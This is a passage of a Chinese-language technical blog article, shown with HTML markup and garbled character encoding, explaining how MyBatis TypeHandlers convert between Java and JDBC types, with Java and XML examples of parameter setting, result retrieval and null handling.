                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ·±å…¥ç†è§£MyBatisç±»å‹è½¬æ¢æœºåˆ¶ï¼ŒæŒæ¡Javaä¸JDBCä¹‹é—´çš„æ¡¥æ¢</h2>
<h2 data-id="heading-1">ä¸€ã€MyBatisæ•´ä½“æ¶æ„ä¸ç±»å‹å¤„ç†æ¨¡å—</h2>
<p>åœ¨æ·±å…¥ç±»å‹å¤„ç†æ¨¡å—ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£MyBatisçš„æ•´ä½“æ¶æ„ï¼Œä»¥åŠç±»å‹å¤„ç†æ¨¡å—åœ¨å…¶ä¸­çš„é‡è¦åœ°ä½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa3fb0c4d5a7446ca23a602eccd2c6f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=wtUr2ytFVsbv4eNXpEOp1UhkPnA%3D" alt="" loading="lazy"/></p>
<p>ä»æ¶æ„å›¾å¯ä»¥çœ‹å‡ºï¼ŒMyBatisé‡‡ç”¨äº†åˆ†å±‚æ¶æ„è®¾è®¡ï¼Œè€Œç±»å‹å¤„ç†æ¨¡å—ï¼ˆTypeHandlerï¼‰ä½äºåŸºç¡€æ”¯æ’‘å±‚ï¼Œæ˜¯è¿æ¥Javaç±»å‹ä¸JDBCç±»å‹çš„æ¡¥æ¢ã€‚å®ƒè´Ÿè´£åœ¨SQLæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°†Javaå¯¹è±¡å‚æ•°è½¬æ¢ä¸ºJDBCèƒ½å¤Ÿè¯†åˆ«çš„å‚æ•°ç±»å‹ï¼Œä»¥åŠå°†ResultSetä¸­çš„æ•°æ®è½¬æ¢ä¸ºJavaå¯¹è±¡ã€‚</p>
<h2 data-id="heading-2">å‹å¤„ç†æ¨¡å—çš„æ ¸å¿ƒèŒè´£</h2>
<p>ç±»å‹å¤„ç†æ¨¡å—ä¸»è¦æ‰¿æ‹…ä»¥ä¸‹æ ¸å¿ƒèŒè´£ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">âœ… Javaç±»å‹ä¸JDBCç±»å‹ç›¸äº’è½¬æ¢ <span class="hljs-operator">-</span> å®ç°åŒå‘ç±»å‹è½¬æ¢
âœ… å‚æ•°è®¾ç½®æ—¶çš„ç±»å‹è½¬æ¢ <span class="hljs-operator">-</span> å°†Javaå‚æ•°è½¬æ¢ä¸ºJDBCå‚æ•°
âœ… ç»“æœé›†è·å–æ—¶çš„ç±»å‹è½¬æ¢ <span class="hljs-operator">-</span> å°†JDBCç»“æœè½¬æ¢ä¸ºJavaå¯¹è±¡
âœ… <span class="hljs-keyword">Null</span>å€¼å¤„ç† <span class="hljs-operator">-</span> å¤„ç†Javaç©ºå€¼ä¸JDBC <span class="hljs-keyword">NULL</span>çš„è½¬æ¢
âœ… ç±»å‹æ³¨å†Œä¸ç®¡ç† <span class="hljs-operator">-</span> ç»´æŠ¤Javaç±»å‹ä¸TypeHandlerçš„æ˜ å°„å…³ç³»
</code></pre>
<h2 data-id="heading-3">ä¸ºä»€ä¹ˆéœ€è¦TypeHandlerï¼Ÿ</h2>
<p>åœ¨Javaåº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´ï¼Œå­˜åœ¨ç€ç±»å‹ç³»ç»Ÿçš„å·®å¼‚ï¼š</p>



































<table><thead><tr><th>Javaç±»å‹</th><th>JDBCç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>String</td><td>VARCHAR, CHAR</td><td>å­—ç¬¦ä¸²ç±»å‹</td></tr><tr><td>Integer</td><td>INTEGER</td><td>æ•´æ•°ç±»å‹</td></tr><tr><td>Long</td><td>BIGINT</td><td>é•¿æ•´æ•°ç±»å‹</td></tr><tr><td>Date</td><td>TIMESTAMP</td><td>æ—¥æœŸæ—¶é—´ç±»å‹</td></tr><tr><td>BigDecimal</td><td>NUMERIC</td><td>ç²¾ç¡®æ•°å€¼ç±»å‹</td></tr></tbody></table>
<p>TypeHandlerçš„æ ¸å¿ƒä½œç”¨å°±æ˜¯è§£å†³è¿™äº›ç±»å‹ä¹‹é—´çš„æ˜ å°„å’Œè½¬æ¢é—®é¢˜ã€‚</p>
<h2 data-id="heading-4">äºŒã€TypeHandlerä½“ç³»æ¶æ„</h2>
<p>TypeHandleré‡‡ç”¨äº†æ³›å‹æ¥å£è®¾è®¡ï¼Œæ”¯æŒå„ç§ç±»å‹çš„æ‰©å±•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ad51ae683ef4acaa902418b69e1a75b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=SzXgf14IkE6foO9Sa0ZNOmOtSb8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">TypeHandleræ¥å£</h2>
<p>TypeHandleræ˜¯ç±»å‹è½¬æ¢çš„æ ¸å¿ƒæ¥å£ï¼Œå®šä¹‰äº†ç±»å‹è½¬æ¢çš„åŸºæœ¬æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; {
    <span class="hljs-comment">// è®¾ç½®PreparedStatementå‚æ•°ï¼ˆJava â†’ JDBCï¼‰</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, 
                     T parameter, JdbcType jdbcType)</span> 
                     <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-comment">// è·å–ResultSetç»“æœï¼ˆJDBC â†’ Javaï¼ŒæŒ‰åˆ—åï¼‰</span>
    T <span class="hljs-title function_">getResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> 
               <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-comment">// è·å–ResultSetç»“æœï¼ˆJDBC â†’ Javaï¼ŒæŒ‰åˆ—ç´¢å¼•ï¼‰</span>
    T <span class="hljs-title function_">getResult</span><span class="hljs-params">(ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> 
               <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-comment">// è·å–CallableStatementç»“æœï¼ˆå­˜å‚¨è¿‡ç¨‹ï¼‰</span>
    T <span class="hljs-title function_">getResult</span><span class="hljs-params">(CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> 
               <span class="hljs-keyword">throws</span> SQLException;
}
</code></pre>
<h2 data-id="heading-6">BaseTypeHandleræŠ½è±¡ç±»</h2>
<p>ä¸ºäº†ç®€åŒ–TypeHandlerçš„å®ç°ï¼ŒMyBatisæä¾›äº†BaseTypeHandleræŠ½è±¡ç±»ï¼Œå®ƒå¸®æˆ‘ä»¬å¤„ç†äº†Nullå€¼æ£€æŸ¥ç­‰é€šç”¨é€»è¾‘ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;T&gt; 
    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, 
                            T parameter, JdbcType jdbcType)</span> 
                            <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (parameter == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¤„ç†Nullå€¼</span>
            ps.setNull(i, jdbcType.TYPE_CODE);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è®¾ç½®éç©ºå‚æ•°ï¼Œç”±å­ç±»å®ç°</span>
            setNonNullParameter(ps, i, parameter, jdbcType);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> 
                      <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> getNullableResult(rs, columnName);
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºnull</span>
        <span class="hljs-keyword">return</span> rs.wasNull() ? <span class="hljs-literal">null</span> : result;
    }

    <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•ï¼Œç”±å­ç±»å®ç°</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        T parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException;
}
</code></pre>
<h2 data-id="heading-7">TypeHandlerç»§æ‰¿ä½“ç³»</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26bad2f4c5c04afb89f4562dafd21504~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=seTQVfs5hUvlRob5Vz3jihj5V5Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€ç±»å‹è½¬æ¢åŒå‘æµç¨‹</h2>
<p>TypeHandlerå®ç°äº†Javaç±»å‹ä¸JDBCç±»å‹ä¹‹é—´çš„åŒå‘è½¬æ¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f9997be96a74b76859dc8ce2cc2a2e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=R66jf4fAEP4quOgUYQxhR1ryAzk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">Java â†’ JDBC è½¬æ¢æµç¨‹</h2>
<p>å½“æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œéœ€è¦å°†Javaå‚æ•°è½¬æ¢ä¸ºJDBCå‚æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// 1. ParameterHandlerè·å–å‚æ•°å€¼
Object <span class="hljs-attr">value</span> = getParameterValue(
    parameterObject, parameterMapping)<span class="hljs-comment">;</span>

// 2. è·å–å¯¹åº”çš„TypeHandler
TypeHandler&lt;?&gt; <span class="hljs-attr">typeHandler</span> = 
    parameterMapping.getTypeHandler()<span class="hljs-comment">;</span>

// 3. è°ƒç”¨setParameterè®¾ç½®å‚æ•°
typeHandler.setParameter(ps, i + 1, value, jdbcType)<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-10">JDBC â†’ Java è½¬æ¢æµç¨‹</h2>
<p>å½“ä»ResultSetè·å–ç»“æœæ—¶ï¼Œéœ€è¦å°†JDBCæ•°æ®è½¬æ¢ä¸ºJavaå¯¹è±¡ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 1. ResultSetHandlerå¤„ç†ResultSet</span>
while (resultSet.next()) {
    <span class="hljs-comment">// 2. æ ¹æ®ResultMappingè·å–TypeHandler</span>
    TypeHandler&lt;?&gt; typeHandler = 
        resultMapping<span class="hljs-selector-class">.getTypeHandler</span>();

    <span class="hljs-comment">// 3. è°ƒç”¨getResultè·å–ç»“æœ</span>
    <span class="hljs-selector-tag">Object</span> value = typeHandler<span class="hljs-selector-class">.getResult</span>(
        resultSet, column);

    <span class="hljs-comment">// 4. è®¾ç½®åˆ°ç›®æ ‡å¯¹è±¡</span>
    metaObject<span class="hljs-selector-class">.setValue</span>(property, value);
}
</code></pre>
<h2 data-id="heading-11">å››ã€å‚æ•°è®¾ç½®æ—¶çš„ç±»å‹è½¬æ¢</h2>
<p>å‚æ•°è®¾ç½®æ˜¯Javaç±»å‹å‘JDBCç±»å‹è½¬æ¢çš„è¿‡ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a139f1c5f914effbc2d910d4b21482f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=JQ5i9FSDz4Y6XO951gOfIG5S5vg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">åŸºæœ¬ç±»å‹è½¬æ¢ç¤ºä¾‹</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StringTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;String&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        String parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// String â†’ VARCHAR</span>
        ps.setString(i, parameter);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// VARCHAR â†’ String</span>
        <span class="hljs-keyword">return</span> rs.getString(columnName);
    }
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;Long&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        Long parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// Long â†’ BIGINT</span>
        ps.setLong(i, parameter);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// BIGINT â†’ Long</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getLong(columnName);
        <span class="hljs-comment">// âš ï¸ å…³é”®ï¼šæ£€æŸ¥æ˜¯å¦ä¸ºNULL</span>
        <span class="hljs-keyword">return</span> value == <span class="hljs-number">0</span> &amp;&amp; rs.wasNull() ? <span class="hljs-literal">null</span> : value;
    }
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;Date&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        Date parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// Date â†’ Timestamp</span>
        ps.setTimestamp(i, 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timestamp</span>(parameter.getTime()));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// Timestamp â†’ Date</span>
        <span class="hljs-type">Timestamp</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> rs.getTimestamp(columnName);
        <span class="hljs-keyword">return</span> timestamp == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : 
               <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(timestamp.getTime());
    }
}
</code></pre>
<h2 data-id="heading-13">Nullå€¼å¤„ç†</h2>
<p>Nullå€¼å¤„ç†æ˜¯å‚æ•°è®¾ç½®ä¸­çš„é‡è¦ç¯èŠ‚ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- åœºæ™¯1ï¼šæ˜ç¡®çš„jdbcType --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"insertUser"</span>&gt;</span>
    INSERT INTO t_user (name, email)
    VALUES (
        #{name, jdbcType=VARCHAR}, 
        #{email, jdbcType=VARCHAR}
    )
<span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>

<span class="hljs-comment">&lt;!-- åœºæ™¯2ï¼šå…¨å±€é…ç½®Nullçš„jdbcType --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jdbcTypeForNull"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"NULL"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
</code></pre>
<p>é‡è¦æç¤ºï¼šæœªæŒ‡å®šjdbcTypeæ—¶ï¼Œä¼ å…¥nullå‚æ•°ä¼šæŠ›å‡ºå¼‚å¸¸ï¼</p>
<h2 data-id="heading-14">äº”ã€ç»“æœé›†è·å–æ—¶çš„ç±»å‹è½¬æ¢</h2>
<p>ç»“æœé›†è·å–æ˜¯JDBCç±»å‹å‘Javaç±»å‹è½¬æ¢çš„è¿‡ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8f85705b7994c8da2d333c98536eced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=a4y9WD%2B28op%2FvBRBXoVesQBIlhM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">ResultSetç»“æœè·å–æµç¨‹</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// éå†ResultSetçš„å®Œæ•´æµç¨‹</span>
while (resultSet.next()) {
    for (ResultMapping mapping : 
         resultMap.getPropertyResultMappings()) {

        <span class="hljs-comment">// è·å–åˆ—å</span>
        String column = mapping<span class="hljs-selector-class">.getColumn</span>();

        <span class="hljs-comment">// è·å–TypeHandler</span>
        TypeHandler&lt;?&gt; handler = 
            mapping<span class="hljs-selector-class">.getTypeHandler</span>();

        <span class="hljs-comment">// è·å–ç»“æœå€¼</span>
        <span class="hljs-selector-tag">Object</span> value = handler<span class="hljs-selector-class">.getResult</span>(
            resultSet, column);

        <span class="hljs-comment">// è®¾ç½®åˆ°ç›®æ ‡å¯¹è±¡</span>
        metaObject<span class="hljs-selector-class">.setValue</span>(
            mapping.getProperty(), value);
    }
}
</code></pre>
<h2 data-id="heading-16">ä¸‰ç§getResultæ–¹å¼</h2>
<p>TypeHandleræä¾›äº†ä¸‰ç§è·å–ç»“æœçš„æ–¹å¼ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">@<span class="hljs-function">Override
<span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getNullableResult</span><span class="hljs-params">(
    ResultSet rs, <span class="hljs-type">String</span> columnName)</span> 
    throws SQLException </span>{
    <span class="hljs-keyword">return</span> rs.<span class="hljs-built_in">getString</span>(columnName);
}
</code></pre>
<p>ä½¿ç”¨åœºæ™¯ï¼š</p>
<pre><code class="hljs language-java" lang="java">&lt;result column=<span class="hljs-string">"user_name"</span> property=<span class="hljs-string">"userName"</span>/&gt;
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
    ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> 
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">return</span> rs.getString(columnIndex);
}
</code></pre>
<p>ä½¿ç”¨åœºæ™¯ï¼šè‡ªåŠ¨æ˜ å°„æˆ–éœ€è¦æŒ‰ç´¢å¼•è·å–æ—¶</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
    CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> 
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">return</span> cs.getString(columnIndex);
}
</code></pre>
<p>ä½¿ç”¨åœºæ™¯ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>"callProcedure" statementType<span class="hljs-operator">=</span>"CALLABLE"<span class="hljs-operator">&gt;</span>
    {<span class="hljs-keyword">call</span> get_user_info(
        #{userId, mode<span class="hljs-operator">=</span><span class="hljs-keyword">IN</span>, jdbcType<span class="hljs-operator">=</span><span class="hljs-type">BIGINT</span>},
        #{userName, mode<span class="hljs-operator">=</span><span class="hljs-keyword">OUT</span>, jdbcType<span class="hljs-operator">=</span><span class="hljs-type">VARCHAR</span>}
    )}
<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span>
</code></pre>
<h2 data-id="heading-17">wasNull()çš„é‡è¦æ€§</h2>
<p>åœ¨ç±»å‹è½¬æ¢ä¸­ï¼ŒwasNull()æ–¹æ³•éå¸¸å…³é”®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
    ResultSet rs, String columnName)</span> 
    <span class="hljs-keyword">throws</span> SQLException {

    <span class="hljs-type">long</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getLong(columnName);
    <span class="hljs-comment">// âš ï¸ å¦‚æœæ•°æ®åº“æ˜¯NULLï¼ŒgetLong()è¿”å›0</span>

    <span class="hljs-comment">// âœ… å¿…é¡»æ£€æŸ¥wasNull()åŒºåˆ†çœŸå®çš„0å’ŒNULL</span>
    <span class="hljs-keyword">return</span> value == <span class="hljs-number">0</span> &amp;&amp; rs.wasNull() ? <span class="hljs-literal">null</span> : value;
}
</code></pre>
<h2 data-id="heading-18">å…­ã€TypeHandleræ³¨å†Œæœºåˆ¶</h2>
<p>TypeHandlerRegistryè´Ÿè´£ç®¡ç†æ‰€æœ‰TypeHandlerçš„æ³¨å†Œå’ŒæŸ¥æ‰¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/089b9e45490544f1bfe3881634b176d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=ECN3JC3i9YWAkTLsa5To5ZUoe8Y%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19">TypeHandlerRegistryç»“æ„</h2>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeHandlerRegistry</span> {
    <span class="hljs-comment">// JDBCç±»å‹ â†’ TypeHandler</span>
